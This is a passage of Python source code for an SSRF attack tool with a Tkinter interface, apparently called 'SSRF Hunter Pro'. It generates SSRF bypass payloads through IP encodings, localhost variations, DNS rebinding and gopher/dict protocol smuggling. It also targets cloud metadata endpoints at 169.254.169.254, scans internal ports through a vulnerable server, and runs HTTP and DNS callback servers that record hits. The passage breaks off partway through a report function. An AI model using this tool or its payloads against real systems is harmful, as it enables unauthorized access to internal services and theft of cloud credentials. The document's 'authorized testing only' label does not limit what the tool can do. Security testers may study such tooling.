        # Main container
        main_frame = tk.Frame(tab, bg=HackerTheme.BG_DARK)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Left side - Options
        left_frame = tk.Frame(main_frame, bg=HackerTheme.BG_DARK)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))

        # Payload type selection
        type_frame = ttk.LabelFrame(left_frame, text="Payload Type",
                                    style='Hacker.TLabelframe')
        type_frame.pack(fill=tk.X, pady=(0, 10))

        self.payload_type = tk.StringVar(value="ip_bypass")

        payload_types = [
            ("ip_bypass", "IP Address Bypasses"),
            ("localhost", "Localhost Variations"),
            ("url_parser", "URL Parser Confusion"),
            ("protocol", "Protocol Smuggling"),
            ("redirect", "Redirect Bypasses"),
            ("dns_rebind", "DNS Rebinding"),
        ]

        for value, text in payload_types:
            rb = tk.Radiobutton(type_frame, text=text, variable=self.payload_type,
                              value=value, command=self._generate_payloads,
                              bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                              selectcolor=HackerTheme.BG_MEDIUM,
                              activebackground=HackerTheme.BG_DARK,
                              activeforeground=HackerTheme.FG_BRIGHT_GREEN,
                              font=HackerTheme.FONT_MONO)
            rb.pack(anchor=tk.W, padx=10, pady=2)

        # Target IP for bypasses
        ip_frame = ttk.LabelFrame(left_frame, text="Target Settings",
                                  style='Hacker.TLabelframe')
        ip_frame.pack(fill=tk.X, pady=10)

        tk.Label(ip_frame, text="Target IP:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(anchor=tk.W, padx=10, pady=2)

        self.target_ip = tk.Entry(ip_frame, width=20,
                                 bg=HackerTheme.BG_MEDIUM,
                                 fg=HackerTheme.FG_GREEN,
                                 insertbackground=HackerTheme.FG_GREEN,
                                 font=HackerTheme.FONT_MONO)
        self.target_ip.pack(padx=10, pady=5, anchor=tk.W)
        self.target_ip.insert(0, "169.254.169.254")

        tk.Label(ip_frame, text="Callback Domain:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(anchor=tk.W, padx=10, pady=2)

        self.payload_callback = tk.Entry(ip_frame, width=25,
                                        bg=HackerTheme.BG_MEDIUM,
                                        fg=HackerTheme.FG_GREEN,
                                        insertbackground=HackerTheme.FG_GREEN,
                                        font=HackerTheme.FONT_MONO)
        self.payload_callback.pack(padx=10, pady=5, anchor=tk.W)
        self.payload_callback.insert(0, "your-server.com")

        # Generate button
        tk.Button(left_frame, text="⚡ Generate Payloads",
                 command=self._generate_payloads,
                 bg=HackerTheme.FG_GREEN,
                 fg=HackerTheme.BG_DARK,
                 font=HackerTheme.FONT_MONO_BOLD,
                 width=20).pack(pady=10)

        tk.Button(left_frame, text="📋 Copy All",
                 command=self._copy_payloads,
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO,
                 width=20).pack(pady=5)

        tk.Button(left_frame, text="💾 Export to File",
                 command=self._export_payloads,
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO,
                 width=20).pack(pady=5)

        # Right side - Payloads output
        right_frame = ttk.LabelFrame(main_frame, text="Generated Payloads",
                                     style='Hacker.TLabelframe')
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        self.payload_text = scrolledtext.ScrolledText(right_frame, width=80, height=30,
                                                      bg=HackerTheme.BG_MEDIUM,
                                                      fg=HackerTheme.FG_GREEN,
                                                      insertbackground=HackerTheme.FG_GREEN,
                                                      font=HackerTheme.FONT_MONO)
        self.payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _create_callback_tab(self):
        """Create callback server tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="📡 Callback Server")

        main_frame = tk.Frame(tab, bg=HackerTheme.BG_DARK)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Server configuration
        config_frame = ttk.LabelFrame(main_frame, text="Server Configuration",
                                      style='Hacker.TLabelframe')
        config_frame.pack(fill=tk.X, pady=(0, 10))

        # HTTP Server
        http_frame = tk.Frame(config_frame, bg=HackerTheme.BG_DARK)
        http_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(http_frame, text="HTTP Server Port:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT)

        self.http_port = tk.Entry(http_frame, width=8,
                                 bg=HackerTheme.BG_MEDIUM,
                                 fg=HackerTheme.FG_GREEN,
                                 insertbackground=HackerTheme.FG_GREEN,
                                 font=HackerTheme.FONT_MONO)
        self.http_port.pack(side=tk.LEFT, padx=10)
        self.http_port.insert(0, "8888")

        self.http_server_btn = tk.Button(http_frame, text="▶ Start HTTP Server",
                                        command=self._toggle_http_server,
                                        bg=HackerTheme.FG_GREEN,
                                        fg=HackerTheme.BG_DARK,
                                        font=HackerTheme.FONT_MONO_BOLD)
        self.http_server_btn.pack(side=tk.LEFT, padx=10)

        self.http_status = tk.Label(http_frame, text="● Stopped",
                                   bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_RED,
                                   font=HackerTheme.FONT_MONO)
        self.http_status.pack(side=tk.LEFT, padx=10)

        # DNS Server
        dns_frame = tk.Frame(config_frame, bg=HackerTheme.BG_DARK)
        dns_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(dns_frame, text="DNS Server Port:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT)

        self.dns_port = tk.Entry(dns_frame, width=8,
                                bg=HackerTheme.BG_MEDIUM,
                                fg=HackerTheme.FG_GREEN,
                                insertbackground=HackerTheme.FG_GREEN,
                                font=HackerTheme.FONT_MONO)
        self.dns_port.pack(side=tk.LEFT, padx=10)
        self.dns_port.insert(0, "5353")

        self.dns_server_btn = tk.Button(dns_frame, text="▶ Start DNS Server",
                                       command=self._toggle_dns_server,
                                       bg=HackerTheme.FG_GREEN,
                                       fg=HackerTheme.BG_DARK,
                                       font=HackerTheme.FONT_MONO_BOLD)
        self.dns_server_btn.pack(side=tk.LEFT, padx=10)

        self.dns_status = tk.Label(dns_frame, text="● Stopped",
                                  bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_RED,
                                  font=HackerTheme.FONT_MONO)
        self.dns_status.pack(side=tk.LEFT, padx=10)

        # Token generator
        token_frame = ttk.LabelFrame(main_frame, text="Tracking Token",
                                     style='Hacker.TLabelframe')
        token_frame.pack(fill=tk.X, pady=10)

        token_inner = tk.Frame(token_frame, bg=HackerTheme.BG_DARK)
        token_inner.pack(fill=tk.X, padx=10, pady=10)

        tk.Button(token_inner, text="🔑 Generate Token",
                 command=self._generate_token,
                 bg=HackerTheme.FG_GREEN,
                 fg=HackerTheme.BG_DARK,
                 font=HackerTheme.FONT_MONO_BOLD).pack(side=tk.LEFT)

        self.current_token = tk.Entry(token_inner, width=40,
                                     bg=HackerTheme.BG_MEDIUM,
                                     fg=HackerTheme.FG_BRIGHT_GREEN,
                                     insertbackground=HackerTheme.FG_GREEN,
                                     font=HackerTheme.FONT_MONO)
        self.current_token.pack(side=tk.LEFT, padx=10)

        tk.Button(token_inner, text="📋 Copy URL",
                 command=self._copy_callback_url,
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=5)

        # Callback log
        log_frame = ttk.LabelFrame(main_frame, text="Callback Log",
                                   style='Hacker.TLabelframe')
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        self.callback_log = scrolledtext.ScrolledText(log_frame, width=80, height=20,
                                                      bg=HackerTheme.BG_MEDIUM,
                                                      fg=HackerTheme.FG_GREEN,
                                                      insertbackground=HackerTheme.FG_GREEN,
                                                      font=HackerTheme.FONT_MONO)
        self.callback_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _create_cloud_tab(self):
        """Create cloud metadata targeting tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="☁️ Cloud Metadata")

        main_frame = tk.Frame(tab, bg=HackerTheme.BG_DARK)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Cloud provider selection
        provider_frame = ttk.LabelFrame(main_frame, text="Cloud Provider",
                                        style='Hacker.TLabelframe')
        provider_frame.pack(fill=tk.X, pady=(0, 10))

        self.cloud_provider = tk.StringVar(value="AWS")

        providers = ["AWS", "GCP", "Azure", "DigitalOcean", "Alibaba", "Oracle", "Kubernetes"]

        btn_frame = tk.Frame(provider_frame, bg=HackerTheme.BG_DARK)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        for provider in providers:
            rb = tk.Radiobutton(btn_frame, text=provider,
                              variable=self.cloud_provider,
                              value=provider,
                              command=self._load_cloud_endpoints,
                              bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                              selectcolor=HackerTheme.BG_MEDIUM,
                              activebackground=HackerTheme.BG_DARK,
                              activeforeground=HackerTheme.FG_BRIGHT_GREEN,
                              font=HackerTheme.FONT_MONO)
            rb.pack(side=tk.LEFT, padx=10)

        # Endpoints list
        endpoints_frame = ttk.LabelFrame(main_frame, text="Metadata Endpoints",
                                         style='Hacker.TLabelframe')
        endpoints_frame.pack(fill=tk.BOTH, expand=True)

        self.cloud_endpoints = scrolledtext.ScrolledText(endpoints_frame,
                                                         width=80, height=25,
                                                         bg=HackerTheme.BG_MEDIUM,
                                                         fg=HackerTheme.FG_GREEN,
                                                         font=HackerTheme.FONT_MONO)
        self.cloud_endpoints.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Buttons
        btn_frame2 = tk.Frame(main_frame, bg=HackerTheme.BG_DARK)
        btn_frame2.pack(fill=tk.X, pady=10)

        tk.Button(btn_frame2, text="⚡ Generate Bypass Payloads",
                 command=self._generate_cloud_bypasses,
                 bg=HackerTheme.FG_GREEN,
                 fg=HackerTheme.BG_DARK,
                 font=HackerTheme.FONT_MONO_BOLD).pack(side=tk.LEFT, padx=5)

        tk.Button(btn_frame2, text="📋 Copy All",
                 command=lambda: self._copy_text(self.cloud_endpoints),
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=5)

        # Load initial endpoints
        self._load_cloud_endpoints()

    def _create_network_tab(self):
        """Create internal network discovery tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="🌐 Network Discovery")

        main_frame = tk.Frame(tab, bg=HackerTheme.BG_DARK)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Port scan configuration
        config_frame = ttk.LabelFrame(main_frame, text="Port Scan via SSRF",
                                      style='Hacker.TLabelframe')
        config_frame.pack(fill=tk.X, pady=(0, 10))

        # Internal host
        host_frame = tk.Frame(config_frame, bg=HackerTheme.BG_DARK)
        host_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(host_frame, text="Internal Host:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT)

        self.internal_host = tk.Entry(host_frame, width=30,
                                     bg=HackerTheme.BG_MEDIUM,
                                     fg=HackerTheme.FG_GREEN,
                                     insertbackground=HackerTheme.FG_GREEN,
                                     font=HackerTheme.FONT_MONO)
        self.internal_host.pack(side=tk.LEFT, padx=10)
        self.internal_host.insert(0, "127.0.0.1")

        # Port range
        tk.Label(host_frame, text="Ports:",
                bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=(20, 0))

        self.port_range = tk.Entry(host_frame, width=30,
                                  bg=HackerTheme.BG_MEDIUM,
                                  fg=HackerTheme.FG_GREEN,
                                  insertbackground=HackerTheme.FG_GREEN,
                                  font=HackerTheme.FONT_MONO)
        self.port_range.pack(side=tk.LEFT, padx=10)
        self.port_range.insert(0, "22,80,443,3306,5432,6379,8080,27017")

        # Common internal services
        services_frame = ttk.LabelFrame(main_frame, text="Common Internal Services",
                                        style='Hacker.TLabelframe')
        services_frame.pack(fill=tk.X, pady=10)

        services_text = """
╔════════════════════════════════════════════════════════════════════════════════════╗
║  SERVICE          PORT      COMMON ENDPOINTS                                        ║
╠════════════════════════════════════════════════════════════════════════════════════╣
║  Redis            6379      redis://127.0.0.1:6379/                                ║
║  Memcached        11211     memcached://127.0.0.1:11211/                           ║
║  MySQL            3306      mysql://127.0.0.1:3306/                                ║
║  PostgreSQL       5432      postgresql://127.0.0.1:5432/                           ║
║  MongoDB          27017     mongodb://127.0.0.1:27017/                             ║
║  Elasticsearch    9200      <http://127.0.0.1:9200/_cluster/health>                  ║
║  Docker API       2375      <http://127.0.0.1:2375/version>                          ║
║  Kubernetes       10255     <http://127.0.0.1:10255/pods>                            ║
║  Consul           8500      <http://127.0.0.1:8500/v1/agent/members>                 ║
║  Vault            8200      <http://127.0.0.1:8200/v1/sys/health>                    ║
║  Jenkins          8080      <http://127.0.0.1:8080/>                                 ║
║  Apache Solr      8983      <http://127.0.0.1:8983/solr/admin/info/system>           ║
╚════════════════════════════════════════════════════════════════════════════════════╝
        """

        services_label = tk.Label(services_frame, text=services_text,
                                 bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_CYAN,
                                 font=("Consolas", 9),
                                 justify=tk.LEFT)
        services_label.pack(padx=10, pady=5)

        # Generate internal service payloads
        btn_frame = tk.Frame(main_frame, bg=HackerTheme.BG_DARK)
        btn_frame.pack(fill=tk.X, pady=10)

        tk.Button(btn_frame, text="⚡ Generate Internal Payloads",
                 command=self._generate_internal_payloads,
                 bg=HackerTheme.FG_GREEN,
                 fg=HackerTheme.BG_DARK,
                 font=HackerTheme.FONT_MONO_BOLD).pack(side=tk.LEFT, padx=5)

        # Results
        results_frame = ttk.LabelFrame(main_frame, text="Internal Network Payloads",
                                       style='Hacker.TLabelframe')
        results_frame.pack(fill=tk.BOTH, expand=True)

        self.internal_payloads = scrolledtext.ScrolledText(results_frame,
                                                           width=80, height=15,
                                                           bg=HackerTheme.BG_MEDIUM,
                                                           fg=HackerTheme.FG_GREEN,
                                                           font=HackerTheme.FONT_MONO)
        self.internal_payloads.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _create_results_tab(self):
        """Create results and reporting tab"""
        tab = ttk.Frame(self.notebook, style='Hacker.TFrame')
        self.notebook.add(tab, text="📊 Results & Reports")

        main_frame = tk.Frame(tab, bg=HackerTheme.BG_DARK)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Results summary
        summary_frame = ttk.LabelFrame(main_frame, text="Scan Summary",
                                       style='Hacker.TLabelframe')
        summary_frame.pack(fill=tk.X, pady=(0, 10))

        self.summary_labels = {}
        stats = [
            ("total_tests", "Total Tests:"),
            ("vulnerabilities", "Vulnerabilities:"),
            ("callbacks", "Callbacks Received:"),
            ("bypasses", "Successful Bypasses:"),
        ]

        stats_frame = tk.Frame(summary_frame, bg=HackerTheme.BG_DARK)
        stats_frame.pack(fill=tk.X, padx=10, pady=10)

        for key, label in stats:
            frame = tk.Frame(stats_frame, bg=HackerTheme.BG_DARK)
            frame.pack(side=tk.LEFT, padx=20)

            tk.Label(frame, text=label,
                    bg=HackerTheme.BG_DARK, fg=HackerTheme.FG_GREEN,
                    font=HackerTheme.FONT_MONO).pack()

            self.summary_labels[key] = tk.Label(frame, text="0",
                                               bg=HackerTheme.BG_DARK,
                                               fg=HackerTheme.FG_BRIGHT_GREEN,
                                               font=HackerTheme.FONT_TITLE)
            self.summary_labels[key].pack()

        # Detailed results
        results_frame = ttk.LabelFrame(main_frame, text="Detailed Results",
                                       style='Hacker.TLabelframe')
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        self.results_text = scrolledtext.ScrolledText(results_frame,
                                                      width=80, height=20,
                                                      bg=HackerTheme.BG_MEDIUM,
                                                      fg=HackerTheme.FG_GREEN,
                                                      font=HackerTheme.FONT_MONO)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Export buttons
        export_frame = tk.Frame(main_frame, bg=HackerTheme.BG_DARK)
        export_frame.pack(fill=tk.X, pady=10)

        tk.Button(export_frame, text="📄 Export JSON",
                 command=lambda: self._export_results("json"),
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=5)

        tk.Button(export_frame, text="📄 Export HTML",
                 command=lambda: self._export_results("html"),
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=5)

        tk.Button(export_frame, text="📄 Export TXT",
                 command=lambda: self._export_results("txt"),
                 bg=HackerTheme.BG_LIGHT,
                 fg=HackerTheme.FG_GREEN,
                 font=HackerTheme.FONT_MONO).pack(side=tk.LEFT, padx=5)

        tk.Button(export_frame, text="🗑️ Clear Results",
                 command=self._clear_results,
                 bg=HackerTheme.FG_RED,
                 fg=HackerTheme.BG_DARK,
                 font=HackerTheme.FONT_MONO).pack(side=tk.RIGHT, padx=5)

    def _create_status_bar(self):
        """Create status bar"""
        status_frame = tk.Frame(self.root, bg=HackerTheme.BG_MEDIUM, height=25)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        status_frame.pack_propagate(False)

        self.status_label = tk.Label(status_frame,
                                    text="Ready | Use responsibly - Authorized testing only",
                                    bg=HackerTheme.BG_MEDIUM,
                                    fg=HackerTheme.FG_DIM_GREEN,
                                    font=HackerTheme.FONT_MONO)
        self.status_label.pack(side=tk.LEFT, padx=10)

        self.time_label = tk.Label(status_frame,
                                  text="",
                                  bg=HackerTheme.BG_MEDIUM,
                                  fg=HackerTheme.FG_DIM_GREEN,
                                  font=HackerTheme.FONT_MONO)
        self.time_label.pack(side=tk.RIGHT, padx=10)

        self._update_time()

    def _update_time(self):
        """Update time display"""
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.time_label.config(text=current_time)
        self.root.after(1000, self._update_time)

    def _process_logs(self):
        """Process log queue"""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self._log(message)
        except queue.Empty:
            pass

        # Process callback server logs
        if self.callback_server:
            try:
                while True:
                    message = self.callback_server.log_queue.get_nowait()
                    self._callback_log(message)
            except queue.Empty:
                pass

        if self.dns_server:
            try:
                while True:
                    message = self.dns_server.log_queue.get_nowait()
                    self._callback_log(message)
            except queue.Empty:
                pass

        self.root.after(100, self._process_logs)

    def _log(self, message: str):
        """Add message to log"""
        self.log_text.insert(tk.END, message + "\\n")
        self.log_text.see(tk.END)

        # Apply color tags
        if "[SUCCESS]" in message or "VULNERABLE" in message:
            self._tag_line("success")
        elif "[ERROR]" in message:
            self._tag_line("error")
        elif "[WARNING]" in message:
            self._tag_line("warning")

    def _tag_line(self, tag: str):
        """Apply tag to last line"""
        self.log_text.tag_add(tag, "end-2l", "end-1l")

    def _callback_log(self, message: str):
        """Add message to callback log"""
        self.callback_log.insert(tk.END, message + "\\n")
        self.callback_log.see(tk.END)

    def _clear_log(self):
        """Clear log text"""
        self.log_text.delete(1.0, tk.END)

    def _start_scan(self):
        """Start SSRF scan"""
        target = self.target_url.get().strip()
        callback = self.callback_host.get().strip()

        if "INJECT" not in target:
            messagebox.showerror("Error", "Target URL must contain 'INJECT' placeholder")
            return

        self.scan_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.scanner.stop_event.clear()

        thread = threading.Thread(target=self._run_scan, args=(target, callback))
        thread.daemon = True
        thread.start()

    def _run_scan(self, target: str, callback: str):
        """Run the scan in background thread"""
        self.log_queue.put("[INFO] Starting SSRF scan...")
        self.log_queue.put(f"[INFO] Target: {target}")
        self.log_queue.put(f"[INFO] Callback: {callback}")
        self.log_queue.put("-" * 60)

        timeout = float(self.timeout_var.get())
        total_tests = 0
        vulnerabilities = 0

        payloads = []

        # Generate payloads based on options
        if self.scan_basic.get():
            token = self.callback_server.tracker.generate_token() if self.callback_server else "test"
            payloads.append(f"http://{callback}:{self.callback_port.get()}/{token}")

        if self.scan_cloud.get():
            for provider, endpoints in PayloadGenerator.CLOUD_METADATA.items():
                payloads.extend(endpoints)

        if self.scan_protocol.get():
            for protocol, proto_payloads in PayloadGenerator.PROTOCOL_PAYLOADS.items():
                payloads.extend(proto_payloads)

        if self.scan_bypass.get():
            # Add bypass variations
            bypasses = PayloadGenerator.generate_localhost_bypasses()
            for bypass in bypasses[:10]:  # Limit bypasses
                payloads.append(f"http://{bypass}/")

        # Test each payload
        for payload in payloads:
            if self.scanner.stop_event.is_set():
                break

            self.log_queue.put(f"[SCAN] Testing: {payload[:80]}...")

            result = self.scanner.test_ssrf_payload(target, payload, timeout)
            total_tests += 1

            if result['vulnerable']:
                vulnerabilities += 1
                self.log_queue.put(f"[SUCCESS] VULNERABLE! Indicator: {result.get('indicator', 'unknown')}")
                self.scan_results.append(result)
            elif result['error']:
                self.log_queue.put(f"[ERROR] {result['error']}")
            else:
                self.log_queue.put(f"[INFO] No vulnerability detected")

            time.sleep(0.1)  # Rate limiting

        # Update results
        self.log_queue.put("-" * 60)
        self.log_queue.put(f"[INFO] Scan complete. Tests: {total_tests}, Vulnerabilities: {vulnerabilities}")

        # Update UI on main thread
        self.root.after(0, self._scan_complete, total_tests, vulnerabilities)

    def _scan_complete(self, total: int, vulns: int):
        """Handle scan completion"""
        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

        self.summary_labels['total_tests'].config(text=str(total))
        self.summary_labels['vulnerabilities'].config(text=str(vulns))

        if self.callback_server:
            callbacks = len(self.callback_server.tracker.get_callbacks())
            self.summary_labels['callbacks'].config(text=str(callbacks))

    def _stop_scan(self):
        """Stop running scan"""
        self.scanner.stop_event.set()
        self.log_queue.put("[WARNING] Scan stopped by user")

    def _generate_payloads(self):
        """Generate payloads based on selection"""
        payload_type = self.payload_type.get()
        target_ip = self.target_ip.get().strip()
        callback = self.payload_callback.get().strip()

        payloads = []

        if payload_type == "ip_bypass":
            payloads = PayloadGenerator.encode_ip_variations(target_ip)
            payloads = [f"http://{p}/" for p in payloads]

        elif payload_type == "localhost":
            bypasses = PayloadGenerator.generate_localhost_bypasses()
            payloads = [f"http://{b}/" for b in bypasses]

        elif payload_type == "url_parser":
            payloads = PayloadGenerator.generate_url_bypass_payloads(target_ip, callback)

        elif payload_type == "protocol":
            for protocol, protos in PayloadGenerator.PROTOCOL_PAYLOADS.items():
                payloads.extend(protos)

        elif payload_type == "redirect":
            payloads = PayloadGenerator.generate_redirect_payloads(callback)

        elif payload_type == "dns_rebind":
            payloads = PayloadGenerator.generate_dns_rebinding_domains(callback)
            payloads = [f"http://{d}/" for d in payloads]

        # Display payloads
        self.payload_text.delete(1.0, tk.END)
        self.payload_text.insert(tk.END, f"# Generated {len(payloads)} payloads\\n")
        self.payload_text.insert(tk.END, f"# Type: {payload_type}\\n")
        self.payload_text.insert(tk.END, "-" * 60 + "\\n\\n")

        for payload in payloads:
            self.payload_text.insert(tk.END, payload + "\\n")

    def _copy_payloads(self):
        """Copy payloads to clipboard"""
        content = self.payload_text.get(1.0, tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        messagebox.showinfo("Copied", "Payloads copied to clipboard!")

    def _export_payloads(self):
        """Export payloads to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'w') as f:
                f.write(self.payload_text.get(1.0, tk.END))
            messagebox.showinfo("Exported", f"Payloads saved to {filename}")

    def _toggle_http_server(self):
        """Toggle HTTP callback server"""
        if self.callback_server and self.callback_server.running:
            self.callback_server.stop()
            self.http_server_btn.config(text="▶ Start HTTP Server",
                                       bg=HackerTheme.FG_GREEN)
            self.http_status.config(text="● Stopped", fg=HackerTheme.FG_RED)
        else:
            port = int(self.http_port.get())
            self.callback_server = CallbackServer(port=port)
            if self.callback_server.start():
                self.http_server_btn.config(text="⬛ Stop HTTP Server",
                                           bg=HackerTheme.FG_RED)
                self.http_status.config(text=f"● Running on port {port}",
                                       fg=HackerTheme.FG_BRIGHT_GREEN)
                self._callback_log(f"[HTTP] Server started on port {port}")
            else:
                messagebox.showerror("Error", "Failed to start HTTP server")

    def _toggle_dns_server(self):
        """Toggle DNS callback server"""
        if self.dns_server and self.dns_server.running:
            self.dns_server.stop()
            self.dns_server_btn.config(text="▶ Start DNS Server",
                                      bg=HackerTheme.FG_GREEN)
            self.dns_status.config(text="● Stopped", fg=HackerTheme.FG_RED)
        else:
            port = int(self.dns_port.get())
            self.dns_server = DNSCallbackServer(port=port)
            if self.dns_server.start():
                self.dns_server_btn.config(text="⬛ Stop DNS Server",
                                          bg=HackerTheme.FG_RED)
                self.dns_status.config(text=f"● Running on port {port}",
                                      fg=HackerTheme.FG_BRIGHT_GREEN)
                self._callback_log(f"[DNS] Server started on port {port}")
            else:
                messagebox.showerror("Error",
                    "Failed to start DNS server (may require root/admin)")

    def _generate_token(self):
        """Generate tracking token"""
        if self.callback_server:
            token = self.callback_server.tracker.generate_token()
        else:
            token = f"{uuid.uuid4().hex[:8]}-{int(time.time())}"

        self.current_token.delete(0, tk.END)
        self.current_token.insert(0, token)

    def _copy_callback_url(self):
        """Copy full callback URL"""
        token = self.current_token.get()
        host = self.callback_host.get()
        port = self.http_port.get()

        url = f"http://{host}:{port}/{token}"

        self.root.clipboard_clear()
        self.root.clipboard_append(url)
        messagebox.showinfo("Copied", f"Callback URL copied:\\n{url}")

    def _load_cloud_endpoints(self):
        """Load cloud metadata endpoints"""
        provider = self.cloud_provider.get()
        endpoints = PayloadGenerator.CLOUD_METADATA.get(provider, [])

        self.cloud_endpoints.delete(1.0, tk.END)
        self.cloud_endpoints.insert(tk.END, f"# {provider} Metadata Endpoints\\n")
        self.cloud_endpoints.insert(tk.END, "-" * 60 + "\\n\\n")

        for endpoint in endpoints:
            self.cloud_endpoints.insert(tk.END, endpoint + "\\n")

    def _generate_cloud_bypasses(self):
        """Generate cloud metadata bypass payloads"""
        provider = self.cloud_provider.get()
        endpoints = PayloadGenerator.CLOUD_METADATA.get(provider, [])

        self.cloud_endpoints.delete(1.0, tk.END)
        self.cloud_endpoints.insert(tk.END, f"# {provider} Bypass Payloads\\n")
        self.cloud_endpoints.insert(tk.END, "-" * 60 + "\\n\\n")

        # Get IP from first endpoint
        if provider in ["AWS", "GCP", "Azure"]:
            target_ip = "169.254.169.254"
        elif provider == "Alibaba":
            target_ip = "100.100.100.200"
        else:
            target_ip = "169.254.169.254"

        # Generate variations
        variations = PayloadGenerator.encode_ip_variations(target_ip)

        for endpoint in endpoints:
            self.cloud_endpoints.insert(tk.END, f"# Original: {endpoint}\\n")
            for var in variations[:5]:  # Limit variations
                modified = endpoint.replace(target_ip, var)
                self.cloud_endpoints.insert(tk.END, modified + "\\n")
            self.cloud_endpoints.insert(tk.END, "\\n")

    def _generate_internal_payloads(self):
        """Generate internal network payloads"""
        host = self.internal_host.get().strip()
        ports_str = self.port_range.get().strip()

        try:
            ports = [int(p.strip()) for p in ports_str.split(',')]
        except:
            ports = [22, 80, 443, 3306, 5432, 6379, 8080]

        self.internal_payloads.delete(1.0, tk.END)
        self.internal_payloads.insert(tk.END, f"# Internal Network Payloads for {host}\\n")
        self.internal_payloads.insert(tk.END, "-" * 60 + "\\n\\n")

        # Generate HTTP probes
        for port in ports:
            self.internal_payloads.insert(tk.END, f"http://{host}:{port}/\\n")

        # Add service-specific endpoints
        service_endpoints = {
            6379: f"dict://{host}:6379/INFO",
            11211: f"gopher://{host}:11211/stats",
            9200: f"http://{host}:9200/_cluster/health",
            2375: f"http://{host}:2375/version",
            8500: f"http://{host}:8500/v1/agent/members",
        }

        self.internal_payloads.insert(tk.END, "\\n# Service-specific probes:\\n")
        for port, endpoint in service_endpoints.items():
            if port in ports:
                self.internal_payloads.insert(tk.END, endpoint + "\\n")

    def _copy_text(self, text_widget):
        """Copy text widget content"""
        content = text_widget.get(1.0, tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        messagebox.showinfo("Copied", "Content copied to clipboard!")

    def _export_results(self, format_type: str):
        """Export results to file"""
        if not self.scan_results:
            messagebox.showwarning("Warning", "No results to export")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=f".{format_type}",
            filetypes=[
                (f"{format_type.upper()} files", f"*.{format_type}"),
                ("All files", "*.*")
            ]
        )

        if not filename:
            return

        try:
            if format_type == "json":
                with open(filename, 'w') as f:
                    json.dump(self.scan_results, f, indent=2, default=str)

            elif format_type == "html":
                html = self._generate_html_report()
                with open(filename, 'w') as f:
                    f.write(html)

            elif format_type == "txt":
                with open(filename, 'w') as f:
                    f.write("SSRF Hunter Pro - Scan Results\\n")
                    f.write("=" * 60 + "\\n\\n")
                    for result in self.scan_results:
                        f.write(f"Payload: {result['payload']}\\n")
                        f.write(f"Vulnerable: {result['vulnerable']}\\n")
                        f.write("-" * 40 + "\\n")

            messagebox.showinfo("Exported", f"Results saved to {filename}")

        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {e}")

    def _generate_html_report(self) -> str:
        """Generate HTML report"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Hunter Pro - Report</title>
    <style>
